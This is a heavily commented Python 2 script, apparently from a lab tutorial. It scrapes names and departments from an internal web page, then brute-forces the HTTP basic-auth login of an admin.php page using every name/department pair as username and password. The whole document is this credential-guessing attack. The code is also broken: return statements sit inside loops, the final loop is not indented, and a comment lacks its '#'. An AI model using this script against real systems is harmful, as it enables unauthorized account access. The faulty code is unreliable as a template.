import requests
from bs4 import BeautifulSoup as bs4 #whenever we use bs4.[something], we refer to some part of the BeautifulSoup module
def downloadPage(url): #a string containing the URL will be the argument
	r = requests.get(url) #we assign the output of the “get” function from the “requests” module to variable “r”
	response = r.content #we use the “content” property to retrieve the content of the page
	return response #the function will return the content of the page via the “response” variable
	
def findNames(response): #web page content (server response) will be an argument to this function
	parser = bs4(response, 'html.parser')  #initialize BeautifulSoup module by referring to it as “bs4”, with two arguments – page content passed already to function and “html_parser”. The initialized module will now be referred to as “parser” throughout the function. 
	names = parser.find_all('td', id='name') #we create a “names” variable and assign to it all elements of type “td” (rows of the table) that have an id attribute of “name”. This function will return a list, so the variable name will now be a list of found names, but together with html markups like <td id=…
	output = [] # initialize a list named “output”
	for name in names: #iterate over every element of the “names” list 
		output.append(name.text) #add pure text of the “names” element without html to the “output” list
 		return output #return the list with just text names
		
		#exactly the same will be done with the departments information:

def findDepts(response):
	parser = bs4(response, 'html.parser')
	names = parser.find_all('td', id='department')
	output = []
	for name in names:
 		output.append(name.text)
 		return output
		
def getAuthorized(url, username, password):  #three arguments will be passed to this function: page url and login credentials
	r = requests.get(url, auth=(username, password))  #initialization of the GET request similar to getting page content, but this time it contains additional parameters of username and password that were passed to this function
	if str(r.status_code) != '401': #if upon sending the request, the response code is not 401 (unauthorized) possibly we are authorized – then do the following:
 		print "\n[!] Username: " + username + " Password: " + password + "Code: " + str(r.status_code) + "\n"


page = downloadPage("http://172.16.120.120")
names = findNames(page) #assign a list of names retrieved from function “findNames” to the “names” variable
uniqNames = sorted(set(names)) #using function “sorted(set(names))” we extract unique names in case some are repeated
depts = findDepts(page) #assign a list of departments retrieved from function “findDepts” to the “depts” variable
uniqDepts = sorted(set(depts)) #using function “sorted(set(depts))” we extract unique department names in case some are repeated
print "[+] Working... "
for name in uniqNames:
	for dept in uniqDepts:
	getAuthorized("http://172.16.120.120/admin.php", name, dept) authentication request with every possible combination of name / department – until both loops end
